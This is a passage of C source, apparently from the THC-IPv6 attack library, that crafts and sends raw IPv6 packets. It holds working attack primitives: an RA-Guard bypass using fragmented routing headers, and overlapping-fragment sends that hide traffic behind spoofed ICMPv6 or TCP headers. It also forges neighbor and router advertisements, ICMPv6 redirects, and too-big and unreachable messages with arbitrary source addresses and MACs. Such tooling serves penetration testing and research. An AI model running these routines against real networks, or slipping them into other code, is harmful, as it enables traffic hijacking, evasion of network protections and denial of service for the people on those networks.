  while (type == NXT_HDR || type == NXT_ROUTE || type == NXT_FRAG ||
         type == NXT_OPTS || type == NXT_PIM || type == NXT_ICMP6 ||
         type == NXT_TCP || type == NXT_UDP || type == NXT_IP4 ||
         type == NXT_IP4_RUDIMENTARY) {
    switch (type) {
      case NXT_ICMP6:
        if (pkt[iptr] == ICMP6_PINGREQUEST || pkt[iptr] == ICMP6_PINGREPLY)
          pkt[iptr] = (pkt[iptr] == ICMP6_PINGREQUEST ? ICMP6_PINGREPLY
                                                      : ICMP6_PINGREQUEST);
        else if (pkt[iptr] == ICMP6_NEIGHBORSOL ||
                 pkt[iptr] == ICMP6_NEIGHBORADV)
          pkt[iptr] = (pkt[iptr] == ICMP6_NEIGHBORSOL ? ICMP6_NEIGHBORADV
                                                      : ICMP6_NEIGHBORSOL);
        else if (pkt[iptr] == ICMP6_ROUTERSOL || pkt[iptr] == ICMP6_ROUTERADV)
          pkt[iptr] = (pkt[iptr] == ICMP6_ROUTERSOL ? ICMP6_ROUTERADV
                                                    : ICMP6_ROUTERSOL);
        else if (_thc_ipv6_showerrors)
          fprintf(stderr, "Warning: ICMP6 type %d can not be inversed\n", type);
        pkt[iptr + 2] = 0;
        pkt[iptr + 3] = 0;
        checksum = checksum_pseudo_header(src, dst, NXT_ICMP6, &pkt[iptr],
                                          pkt_len - iptr);
        pkt[iptr + 2] = checksum / 256;
        pkt[iptr + 3] = checksum % 256;
        type = -1;
        break;
      case NXT_MIPV6:
      case NXT_PIM:
      case NXT_UDP:
      case NXT_TCP:
      case NXT_IP4:
      case NXT_IP4_RUDIMENTARY:
        if (_thc_ipv6_showerrors)
          fprintf(stderr,
                  "Warning: inverse_packet has not implement type %d yet!\n",
                  type);
        // fall through
      case NXT_NONXT:
      case NXT_DATA:
      case NXT_AH:
      case NXT_ESP:
        type = -1;  // no processing of other headers
        break;
      case NXT_ROUTE:
      case NXT_FRAG:
      case NXT_HDR:
        if (_thc_ipv6_showerrors)
          fprintf(stderr,
                  "Warning: inverse_packet has not implement type %d yet!\n",
                  type);
        type = pkt[iptr];
        iptr += (pkt[iptr + 1] + 1) * 8;
        if (iptr + 4 > pkt_len) {
          if (_thc_ipv6_showerrors)
            fprintf(
                stderr,
                "Warning: packet to inverse is shorter than header tells me\n");
          type = -1;
        }
        break;
      default:
        if (_thc_ipv6_showerrors)
          fprintf(stderr, "Warning: Unsupported header type %d!\n", type);
        // XXX TODO FIXME : other packet types
    }
  }
  if (type != -1)
    if (_thc_ipv6_showerrors)
      fprintf(stderr, "Warning: Unsupported header type %d!\n", type);

  if (debug) thc_dump_data(pkt, pkt_len, "Inversed Packet");
  return pkt;
}

int thc_send_raguard_bypass6(char *interface, unsigned char *src,
                             unsigned char *dst, unsigned char *srcmac,
                             unsigned char *dstmac, unsigned char type,
                             unsigned char *data, int data_len, int mtu) {
  unsigned char *pkt = NULL;
  int            pkt_len, frag_len, mymtu = thc_get_mtu(interface);
  unsigned char  buf[mymtu];
  int count, id = time(NULL) % 2000000000, offset = 0, last_size, more_runs = 1,
             rest = data_len, to_copy;

  if (mtu >= 8 && mtu < mymtu) mymtu = mtu;

  memset(buf, 0, sizeof(buf));

  buf[0] = NXT_ROUTE;
  buf[2] = 0x01;
  buf[4] = 0x01;
  buf[5] = 0x02;
  buf[8] = NXT_DST;
  buf[16] = NXT_ROUTE;
  buf[16 + 2] = 0x01;
  buf[16 + 4] = 0x01;
  buf[16 + 5] = 0x02;
  buf[24] = type;
  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, src,
                                      dst, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_hdr_fragment(pkt, &pkt_len, offset / 8, more_runs, id) < 0)
    return -1;
  if (thc_add_data6(pkt, &pkt_len, NXT_DST, buf, 32) < 0) return -1;
  thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
  pkt = thc_destroy_packet(pkt);
  offset += 32;
  if (data_len > 32)
    to_copy = 32;
  else {
    to_copy = data_len;
    more_runs = 0;
  }
  memcpy(buf, data, to_copy);
  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, src,
                                      dst, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_hdr_fragment(pkt, &pkt_len, offset / 8, more_runs, id) < 0)
    return -1;
  if (thc_add_data6(pkt, &pkt_len, NXT_DST, buf, to_copy) < 0) return -1;
  thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
  pkt = thc_destroy_packet(pkt);
  offset += to_copy;
  rest -= to_copy;

  while (rest > 0) {
    if (data_len > mymtu - 48)
      to_copy = mymtu - 48;
    else {
      to_copy = rest;
      more_runs = 0;
    }
    memcpy(buf, data, to_copy);
    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, src,
                                        dst, 0, 0, 0, 0, 0)) == NULL)
      return -1;
    if (thc_add_hdr_fragment(pkt, &pkt_len, offset / 8, more_runs, id) < 0)
      return -1;
    if (thc_add_data6(pkt, &pkt_len, NXT_DST, buf, to_copy) < 0) return -1;
    thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
    pkt = thc_destroy_packet(pkt);
    offset += to_copy;
    rest -= to_copy;
  }

  return 0;
}

int thc_send_as_fragment6(char *interface, unsigned char *src,
                          unsigned char *dst, unsigned char type,
                          unsigned char *data, int data_len, int frag_len) {
  unsigned char *pkt = NULL, *srcmac, *dstmac;
  int            pkt_len, mymtu = thc_get_mtu(interface);
  unsigned char  buf[frag_len];
  int count, id = time(NULL) % 2000000000, dptr = 0, last_size, run = 0;

  if (frag_len > mymtu - 48) frag_len = mymtu - 48;
  if (frag_len % 8 > 0) frag_len = (frag_len / 8) * 8;
  if (frag_len < 8) frag_len = 8;

  if ((srcmac = thc_get_own_mac(interface)) == NULL) return -1;
  if ((dstmac = thc_get_mac(interface, src, dst)) == NULL) {
    free(srcmac);
    return -1;
  }

  count = data_len / frag_len;
  if (data_len % frag_len > 0) {
    count++;
    last_size = data_len % frag_len;
  } else
    last_size = frag_len;

  if (debug)
    printf(
        "DEBUG: data to fragment has size of %d bytes, sending %d packets with "
        "size %d, last packet has %d bytes\n",
        data_len, count, frag_len, last_size);

  while (count) {
    if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src,
                                        dst, 0, 0, 0, 0, 0)) == NULL) {
      free(srcmac);
      free(dstmac);
      return -1;
    }
    if (thc_add_hdr_fragment(pkt, &pkt_len, dptr / 8, count == 1 ? 0 : 1, id)) {
      free(srcmac);
      free(dstmac);
      return -1;
    }
    if (count > 1)
      memcpy(buf, data + run * frag_len, frag_len);
    else
      memcpy(buf, data + run * frag_len, last_size);
    dptr += frag_len;
    run++;
    if (thc_add_data6(pkt, &pkt_len, type, buf,
                      count == 1 ? last_size : frag_len)) {
      free(srcmac);
      free(dstmac);
      return -1;
    }
    thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
    pkt = thc_destroy_packet(pkt);
    count--;
  }
  free(srcmac);
  free(dstmac);
  return 0;
}

// overlap_spoof_types:
//   -1 = icmpv6 toobig
//    0 = icmpv6 echo request
//    1-65535 = tcp (dst port)
//
int thc_send_as_overlapping_last_fragment6(
    char *interface, unsigned char *src, unsigned char *dst, unsigned char type,
    unsigned char *data, int data_len, int frag_len, int overlap_spoof_type) {
  unsigned char *pkt = NULL, *srcmac, *dstmac;
  int            pkt_len, mymtu = thc_get_mtu(interface);
  unsigned char  buf[frag_len], *adata;
  int count, id = time(NULL) % 2000000000, dptr = 0, last_size, run = 0;

  if (overlap_spoof_type < -1 || overlap_spoof_type > 65535) {
    fprintf(stderr, "Error: invalid overlap_spoof_type: %d\n",
            overlap_spoof_type);
    return -1;
  }

  if (frag_len > mymtu - 56)  // we need extra bytes for hdr, frag + overlap
    frag_len = mymtu - 56;
  if (frag_len % 8 > 0) frag_len = (frag_len / 8) * 8;
  if (frag_len < 8) frag_len = 24;

  if ((srcmac = thc_get_own_mac(interface)) == NULL) return -1;
  if ((dstmac = thc_get_mac(interface, src, dst)) == NULL) {
    free(srcmac);
    return -1;
  }

  if ((adata = malloc(data_len + frag_len + 8)) == NULL) {
    fprintf(stderr, "Error: unable to allocate %d bytes of memory\n",
            data_len + frag_len - 8);
    free(srcmac);
    free(dstmac);
    return -1;
  }

  memset(adata, 0, frag_len + 8);
  memcpy(adata + frag_len + 8, data, data_len);
  data_len += frag_len + 8;  // only offset + length for pk2 #2 must be changed

  adata[0] = NXT_DST;
  adata[1] = ((frag_len - 16) / 8) - 1;
  if (overlap_spoof_type < 1) {
    adata[frag_len - 16] = NXT_ICMP6;
    adata[frag_len - 6] = getpid() % 256;  // fake chksum for icmp
    adata[frag_len - 5] = getpid() / 256;
    if (overlap_spoof_type == 0) {
      adata[frag_len - 8] = ICMP6_PING;
      adata[frag_len - 1] = 1;  // seq 1
    } else {
      adata[frag_len - 8] = ICMP6_TOOBIG;
      adata[frag_len - 2] = 5;  // mtu 1280
    }
  } else {
    adata[frag_len - 16] = NXT_TCP;
    adata[frag_len - 8] = 44;  // scrport
    adata[frag_len - 7] = 44;
    adata[frag_len - 6] = overlap_spoof_type / 256;  // dstport
    adata[frag_len - 5] = overlap_spoof_type % 256;
    adata[frag_len - 4] = 1;
    adata[frag_len - 3] = getpid() % 256;  // fake seq num
    adata[frag_len - 2] = getpid() % 256;  // fake seq num
    adata[frag_len - 1] = 2;
  }
  adata[frag_len] = type;

  count = data_len / frag_len;
  if (data_len % frag_len > 0) {
    count++;
    last_size = data_len % frag_len;
  } else
    last_size = frag_len;

  if (debug)
    printf(
        "DEBUG: data to fragment has size of %d bytes (incl. spoof data), "
        "sending %d packets with size %d, last packet has %d bytes\n",
        data_len, count, frag_len, last_size);

  while (count) {
    if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src,
                                        dst, 0, 0, 0, 0, 0)) == NULL) {
      free(srcmac);
      free(dstmac);
      return -1;
    }
    if (thc_add_hdr_fragment(pkt, &pkt_len, dptr / 8, count == 1 ? 0 : 1, id)) {
      free(srcmac);
      free(dstmac);
      return -1;
    }

    if (count > 1)
      memcpy(buf, adata + run * frag_len, frag_len);
    else
      memcpy(buf, adata + run * frag_len, last_size);

    if (thc_add_data6(pkt, &pkt_len, NXT_DST, buf,
                      count == 1 ? last_size : frag_len)) {
      free(srcmac);
      free(dstmac);
      return -1;
    }

    dptr += frag_len;
    if (run == 0) dptr -= 16;

    thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
    pkt = thc_destroy_packet(pkt);
    run++;
    count--;
  }

  free(adata);
  free(srcmac);
  free(dstmac);
  return 0;
}

// overlap_spoof_types:
//   -1 = icmpv6 toobig
//    0 = icmpv6 echo request
//    1-65535 = tcp (dst port)
//
int thc_send_as_overlapping_first_fragment6(
    char *interface, unsigned char *src, unsigned char *dst, unsigned char type,
    unsigned char *data, int data_len, int frag_len, int overlap_spoof_type) {
  unsigned char *pkt = NULL, *srcmac, *dstmac;
  int            pkt_len, mymtu = thc_get_mtu(interface);
  unsigned char  buf[frag_len], *adata;
  int count, id = time(NULL) % 2000000000, dptr = 0, last_size, run = 0;

  if (overlap_spoof_type < -1 || overlap_spoof_type > 65535) {
    fprintf(stderr, "Error: invalid overlap_spoof_type: %d\n",
            overlap_spoof_type);
    return -1;
  }

  if (frag_len > mymtu - 56)  // we need extra bytes for hdr, frag + overlap
    frag_len = mymtu - 56;
  if (frag_len % 8 > 0) frag_len = (frag_len / 8) * 8;
  if (frag_len < 8) frag_len = 24;

  if ((srcmac = thc_get_own_mac(interface)) == NULL) return -1;
  if ((dstmac = thc_get_mac(interface, src, dst)) == NULL) {
    free(srcmac);
    return -1;
  }

  if ((adata = malloc(data_len + frag_len + 8)) == NULL) {
    fprintf(stderr, "Error: unable to allocate %d bytes of memory\n",
            data_len + frag_len - 8);
    free(srcmac);
    free(dstmac);
    return -1;
  }

  memset(adata, 0, frag_len + 8);
  memcpy(adata + frag_len + 8, data, data_len);
  data_len += frag_len + 8;  // only offset + length for pk2 #2 must be changed

  adata[0] = NXT_DST;
  adata[1] = ((frag_len - 16) / 8) - 1;
  if (overlap_spoof_type < 1) {
    adata[frag_len - 16] = NXT_ICMP6;
    adata[frag_len - 6] = getpid() % 256;  // fake chksum for icmp
    adata[frag_len - 5] = getpid() / 256;
    if (overlap_spoof_type == 0) {
      adata[frag_len - 8] = ICMP6_PING;
      adata[frag_len - 1] = 1;  // seq 1
    } else {
      adata[frag_len - 8] = ICMP6_TOOBIG;
      adata[frag_len - 2] = 5;  // mtu 1280
    }
  } else {
    adata[frag_len - 16] = NXT_TCP;
    adata[frag_len - 8] = 44;  // scrport
    adata[frag_len - 7] = 44;
    adata[frag_len - 6] = overlap_spoof_type / 256;  // dstport
    adata[frag_len - 5] = overlap_spoof_type % 256;
    adata[frag_len - 4] = 1;
    adata[frag_len - 3] = getpid() % 256;  // fake seq num
    adata[frag_len - 2] = getpid() % 256;  // fake seq num
    adata[frag_len - 1] = 2;
  }
  adata[frag_len] = type;

  count = data_len / frag_len;
  if (data_len % frag_len > 0) {
    count++;
    last_size = data_len % frag_len;
  } else
    last_size = frag_len;

  if (debug)
    printf(
        "DEBUG: data to fragment has size of %d bytes (incl. spoof data), "
        "sending %d packets with size %d, last packet has %d bytes\n",
        data_len, count, frag_len, last_size);

  while (count) {
    if (run > 0) {
      if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len,
                                          src, dst, 0, 0, 0, 0, 0)) == NULL) {
        free(srcmac);
        free(dstmac);
        free(adata);
        return -1;
      }
      if (thc_add_hdr_fragment(pkt, &pkt_len, dptr / 8, count == 1 ? 0 : 1,
                               id)) {
        free(srcmac);
        free(dstmac);
        free(adata);
        return -1;
      }

      if (count > 1)
        memcpy(buf, adata + run * frag_len, frag_len);
      else
        memcpy(buf, adata + run * frag_len, last_size);

      if (thc_add_data6(pkt, &pkt_len, NXT_DST, buf,
                        count == 1 ? last_size : frag_len)) {
        free(srcmac);
        free(dstmac);
        free(adata);
        return -1;
      }

      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
      pkt = thc_destroy_packet(pkt);
    }

    dptr += frag_len;
    if (run == 0) dptr -= 16;

    run++;
    count--;
  }

  // now we send the first pkt
  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src,
                                      dst, 0, 0, 0, 0, 0)) == NULL) {
    free(srcmac);
    free(dstmac);
    free(adata);
    return -1;
  }

  if (thc_add_hdr_fragment(pkt, &pkt_len, 0, 1, id)) {
    free(srcmac);
    free(dstmac);
    free(adata);
    return -1;
  }

  memcpy(buf, adata, frag_len);

  if (thc_add_data6(pkt, &pkt_len, NXT_DST, buf, frag_len)) {
    free(srcmac);
    free(dstmac);
    free(adata);
    return -1;
  }

  thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
  pkt = thc_destroy_packet(pkt);

  free(adata);
  free(srcmac);
  free(dstmac);
  return 0;
}

int thc_ping6(char *interface, unsigned char *src, unsigned char *dst, int size,
              int count) {  //, char **packet, int *packet_len) {
  unsigned char *pkt = NULL;
  int            pkt_len;
  unsigned char  buf[size];
  int            ret = 0, counter = count;

  memset(buf, 'A', size);

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src,
                                      dst, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xfacebabe,
                    (unsigned char *)&buf, size, 0) < 0)
    return -1;

  if (count < 0)
    counter = 1;
  else
    counter = count;
  while (counter > 0) {
    ret += thc_generate_and_send_pkt(interface, NULL, NULL, pkt, &pkt_len);
    counter--;
  }

  pkt = thc_destroy_packet(pkt);

  return ret;
}

int thc_ping26(char *interface, unsigned char *srcmac, unsigned char *dstmac,
               unsigned char *src, unsigned char *dst, int size,
               int count) {  //, char **packet, int *packet_len) {
  unsigned char *pkt = NULL;
  int            pkt_len;
  unsigned char  buf[size];
  int            ret = 0, counter = count;

  memset(buf, 'A', size);

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src,
                                      dst, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xfacebabe,
                    (unsigned char *)&buf, size, 0) < 0)
    return -1;

  if (count < 0)
    counter = 1;
  else
    counter = count;
  while (counter > 0) {
    ret += thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
    counter--;
  }

  pkt = thc_destroy_packet(pkt);

  return ret;
}

int thc_neighboradv6(char *interface, unsigned char *src, unsigned char *dst,
                     unsigned char *srcmac, unsigned char *dstmac,
                     unsigned int flags, unsigned char *target) {
  unsigned char *pkt = NULL, *mysrc, *mydst, *mysrcmac;
  int            pkt_len;
  unsigned char  buf[24];
  int            ret;

  if (src == NULL)
    mysrc = thc_get_own_ipv6(interface, dst, PREFER_LINK);
  else
    mysrc = src;
  if (target == NULL) target = mysrc;
  if (dst == NULL)
    mydst = thc_resolve6("ff02:0:0:0:0:0:0:1");
  else
    mydst = dst;
  if (srcmac == NULL)
    mysrcmac = thc_get_own_mac(interface);
  else
    mysrcmac = srcmac;

  memcpy(buf, target, 16);
  if (mysrcmac != NULL) {
    buf[16] = 2;
    buf[17] = 1;
    memcpy(&buf[18], mysrcmac, 6);
  }

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, mysrc,
                                      mydst, 0, 0, 0, 0, 0)) == NULL) {
    if (dst == NULL) free(mydst);
    if (src == NULL) free(mysrc);
    if (srcmac == NULL) free(mysrcmac);
    return -1;
  }
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_NEIGHBORADV, 0, flags,
                    (unsigned char *)&buf, sizeof(buf), 0) < 0) {
    if (dst == NULL) free(mydst);
    if (src == NULL) free(mysrc);
    if (srcmac == NULL) free(mysrcmac);
    return -1;
  }

  ret = thc_generate_and_send_pkt(interface, mysrcmac, dstmac, pkt, &pkt_len);
  pkt = thc_destroy_packet(pkt);
  if (dst == NULL) free(mydst);
  if (src == NULL) free(mysrc);
  if (srcmac == NULL) free(mysrcmac);

  return ret;
}

int thc_routersol6(char *interface, unsigned char *src, unsigned char *dst,
                   unsigned char *srcmac, unsigned char *dstmac) {
  unsigned char *pkt = NULL, *mydst;
  int            pkt_len;
  int            ret;

  //  unsigned char buf[8];

  if (dst == NULL)
    mydst = thc_resolve6("ff02:0:0:0:0:0:0:2");
  else
    mydst = dst;

  //  memset(buf, 0, sizeof(buf));
  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, src,
                                      mydst, 0, 0, 0, 0, 0)) == NULL) {
    if (dst == NULL) free(mydst);
    return -1;
  }
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERSOL, 0, 0, NULL,
                    0 /*(unsigned char*)&buf, sizeof(buf) */, 0) < 0) {
    if (dst == NULL) free(mydst);
    return -1;
  }

  ret = thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
  pkt = thc_destroy_packet(pkt);
  if (dst == NULL) free(mydst);

  return ret;
}

int thc_neighborsol6(char *interface, unsigned char *src, unsigned char *dst,
                     unsigned char *target, unsigned char *srcmac,
                     unsigned char *dstmac) {
  unsigned char *pkt = NULL, *mysrc, *mymac = NULL, *mydst;
  int            pkt_len;
  unsigned char  buf[24];
  int            ret;

  if (target == NULL && dst == NULL) return -1;

  if (src == NULL) {
    if (dst != NULL)
      mysrc = thc_get_own_ipv6(interface, dst, PREFER_LINK);
    else if (target != NULL)
      mysrc = thc_get_own_ipv6(interface, target, PREFER_LINK);
    else
      mysrc = thc_get_own_ipv6(interface, NULL, PREFER_LINK);
  } else
    mysrc = src;
  if (srcmac == NULL)
    mymac = thc_get_own_mac(interface);
  else
    mymac = srcmac;
  if (dst == NULL) {
    // mydst = thc_resolve6("ff02::1");    // we could do a limited multicast
    // here but we dont
    mydst = thc_resolve6("ff02::1:ff00:0");
    memcpy(mydst + 13, target + 13, 3);
  } else
    mydst = dst;
  if (target == NULL) target = mydst;

  memcpy(buf, target, 16);
  if (mymac != NULL) {
    buf[16] = 1;
    buf[17] = 1;
    memcpy(&buf[18], mymac, 6);
  }

  // XXX TODO FIXME: check if dst ip6 in ip6 header is target ip or multicast
  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, mysrc,
                                      mydst, 0, 0, 0, 0, 0)) == NULL) {
    if (dst == NULL) free(mydst);
    if (src == NULL) free(mysrc);
    if (srcmac == NULL) free(mymac);
    return -1;
  }
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_NEIGHBORSOL, 0, 0,
                    (unsigned char *)&buf, 24, 0) < 0) {
    if (dst == NULL) free(mydst);
    if (src == NULL) free(mysrc);
    if (srcmac == NULL) free(mymac);
    return -1;
  }

  ret = thc_generate_and_send_pkt(interface, mymac, dstmac, pkt, &pkt_len);
  pkt = thc_destroy_packet(pkt);
  if (dst == NULL) free(mydst);
  if (src == NULL) free(mysrc);
  if (srcmac == NULL) free(mymac);

  return ret;
}

int thc_routeradv6(char *interface, unsigned char *src, unsigned char *dst,
                   unsigned char *srcmac, unsigned char default_ttl,
                   int managed, unsigned char *prefix, int prefixlen, int mtu,
                   unsigned int lifetime) {
  unsigned char *pkt = NULL, *mysrc, *mydst, *mymac;
  int            pkt_len, ret = 0;
  unsigned char  buf[56];
  unsigned int   flags;

  if (prefix == NULL) return -1;

  if (src == NULL)
    mysrc = thc_get_own_ipv6(interface, NULL, PREFER_LINK);
  else
    mysrc = src;
  if (srcmac == NULL)
    mymac = thc_get_own_mac(interface);
  else
    mymac = srcmac;
  if (dst == NULL)
    mydst = thc_resolve6("ff02:0:0:0:0:0:0:1");
  else
    mydst = dst;

  flags = default_ttl << 24;
  if (managed) flags += (128 + 64 + 32 + 8) << 16;
  flags += (lifetime > 65535 ? 65535 : lifetime);

  memset(buf, 0, sizeof(buf));
  buf[1] = 250;  // this defaults reachability checks to approx 1 minute
  buf[5] =
      30;  // this defaults neighbor solitication messages to aprox 15 seconds
  // options start at byte 12
  // mtu
  buf[8] = 5;
  buf[9] = 1;
  if (mtu) {
    buf[12] = mtu / 16777216;
    buf[13] = (mtu % 16777216) / 65536;
    buf[14] = (mtu % 65536) / 256;
    buf[15] = mtu % 256;
  }
  // prefix info
  buf[16] = 3;
  buf[17] = 4;
  buf[18] = prefixlen;
  if (managed) buf[19] = 128 + 64 + 32 + 16;
  if (lifetime) {
    buf[20] = lifetime / 16777216;
    buf[21] = (lifetime % 16777216) / 65536;
    buf[22] = (lifetime % 65536) / 256;
    buf[23] = lifetime % 256;
    memcpy(&buf[24], &buf[20], 4);
  }
  // 4 bytes reserved
  memcpy(&buf[32], prefix, 16);
  // source link
  buf[48] = 1;
  buf[49] = 1;
  if (mymac != NULL) memcpy(&buf[50], mymac, 6);

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, mysrc,
                                      mydst, 0, 0, 0, 0, 0)) == NULL) {
    if (dst == NULL) free(mydst);
    if (src == NULL) free(mysrc);
    if (srcmac == NULL) free(mymac);
    return -1;
  }
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, flags,
                    (unsigned char *)&buf, sizeof(buf), 0) < 0) {
    if (dst == NULL) free(mydst);
    if (src == NULL) free(mysrc);
    if (srcmac == NULL) free(mymac);
    return -1;
  }

  ret = thc_generate_and_send_pkt(interface, mymac, NULL, pkt, &pkt_len);
  pkt = thc_destroy_packet(pkt);
  if (dst == NULL) free(mydst);
  if (src == NULL) free(mysrc);
  if (srcmac == NULL) free(mymac);

  return ret;
}

int thc_toobig6(char *interface, unsigned char *src, unsigned char *srcmac,
                unsigned char *dstmac, unsigned int mtu,
                unsigned char *orig_pkt, int orig_pkt_len) {
  unsigned char *pkt = NULL, *dst;
  int            pkt_len;
  unsigned char  buf[1500];
  int            buflen = orig_pkt_len, ret;

  //  if (orig_pkt_len > 0)
  //    buflen = orig_pkt_len > mtu - 48 ? mtu - 48 : orig_pkt_len;
  if (buflen < 1) return -1;
  if (buflen > thc_get_mtu(interface) - 48)
    buflen = thc_get_mtu(interface) - 48 - do_hdr_size;
  memcpy(buf, orig_pkt, buflen);
  dst = orig_pkt + 8;

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src,
                                      dst, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_TOOBIG, 0, mtu, (unsigned char *)&buf,
                    buflen, 0) < 0)
    return -1;

  ret = thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
  pkt = thc_destroy_packet(pkt);

  return ret;
}

int thc_paramprob6(char *interface, unsigned char *src, unsigned char *srcmac,
                   unsigned char *dstmac, unsigned char code,
                   unsigned int pointer, unsigned char *orig_pkt,
                   int orig_pkt_len) {
  unsigned char *pkt = NULL, *dst;
  int            pkt_len, ret;
  unsigned char  buf[1022];

  if (orig_pkt_len > 0)
    memcpy(buf, orig_pkt, orig_pkt_len > 1022 ? 1022 : orig_pkt_len);
  dst = orig_pkt + 8;

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src,
                                      dst, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PARAMPROB, code, pointer,
                    (unsigned char *)&buf,
                    orig_pkt_len > 1022 ? 1022 : orig_pkt_len, 0) < 0)
    return -1;

  ret = thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
  pkt = thc_destroy_packet(pkt);

  return ret;
}

int thc_unreach6(char *interface, unsigned char *src, unsigned char *srcmac,
                 unsigned char *dstmac, unsigned char code,
                 unsigned char *orig_pkt, int orig_pkt_len) {
  unsigned char *pkt = NULL, *dst;
  int            pkt_len, ret;
  unsigned char  buf[1022];

  if (orig_pkt_len > 0)
    memcpy(buf, orig_pkt, orig_pkt_len > 1022 ? 1022 : orig_pkt_len);
  dst = orig_pkt + 8;

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src,
                                      dst, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_UNREACH, code, 0,
                    (unsigned char *)&buf,
                    orig_pkt_len > 1022 ? 1022 : orig_pkt_len, 0) < 0)
    return -1;

  ret = thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
  pkt = thc_destroy_packet(pkt);

  return ret;
}

int thc_redir6(char *interface, unsigned char *src, unsigned char *srcmac,
               unsigned char *dstmac, unsigned char *newrouter,
               unsigned char *newroutermac, unsigned char *orig_pkt,
               int orig_pkt_len) {
  unsigned char *pkt = NULL, dst[16], osrc[16];
  int            pkt_len, ret;
  unsigned char  buf[1070];

  memset(buf, 0, sizeof(buf));
  memcpy(dst, orig_pkt + 8, 16);
  memcpy(osrc, orig_pkt + 24, 16);
  memcpy(buf, newrouter, 16);
  memcpy(&buf[16], osrc, 16);
  buf[32] = 2;
  buf[33] = 1;
  memcpy(&buf[34], newroutermac, 6);
  buf[40] = 4;
  buf[41] = orig_pkt_len > 1022 ? 128 : (orig_pkt_len + 8) / 8;
  if ((orig_pkt_len + 8) % 8 > 0) buf[41] += 1;

  if (orig_pkt_len > 0)
    memcpy(buf + 48, orig_pkt, orig_pkt_len > 1022 ? 1022 : orig_pkt_len);

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, src,
                                      dst, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_REDIR, 0, 0, (unsigned char *)&buf,
                    orig_pkt_len > 1022 ? 1042 : orig_pkt_len + 48, 0) < 0)
    return -1;

  ret = thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
  pkt = thc_destroy_packet(pkt);

  return ret;
}

unsigned char *thc_create_ipv6_extended(char *interface, int prefer,
                                        int *pkt_len, unsigned char *src,
                                        unsigned char *dst, int ttl, int length,
                                        int label, int class, int version) {
  thc_ipv6_hdr * hdr;
  unsigned char *my_src;
  char *         pkt = NULL;

  *pkt_len = 40;
  pkt = malloc(sizeof(thc_ipv6_hdr));
  hdr = (thc_ipv6_hdr *)pkt;
  if (pkt == NULL) return NULL;

  hdr->pkt = NULL;
  hdr->pkt_len = 0;

  if (src == NULL)
    my_src = thc_get_own_ipv6(interface, dst, prefer);
  else
    my_src = src;

  if (dst == NULL || my_src == NULL) {
    if (src == NULL) free(my_src);
    free(pkt);
    return NULL;
  }

  memcpy(hdr->src, my_src, 16);
  memcpy(hdr->dst, dst, 16);
  hdr->final_dst = hdr->dst;
  hdr->original_src = hdr->src;
  if (version == 0)
    hdr->version = 6;
  else if (version == -1)
    hdr->version = 0;
  else
    hdr->version = version;
  if (length == -1)
    hdr->length = 0;
  else
    hdr->length = length;
  if (class == -1)
    hdr->class = 0;
  else
    hdr->class = class;
  if (label == -1)
    hdr->label = 0;
  else
    hdr->label = label;
  if (ttl == 0)
    hdr->ttl = 255;
  else if (ttl == -1)
    hdr->ttl = 0;
  else
    hdr->ttl = ttl;

  hdr->next_segment = NULL;
  hdr->final = NULL;
  hdr->next = NXT_NONXT;
  hdr->final_type = NXT_NONXT;

  if (src == NULL) free(my_src);
  return pkt;
}

unsigned char *thc_create_ipv6(char *interface, int *pkt_len,
                               unsigned char *src, unsigned char *dst) {
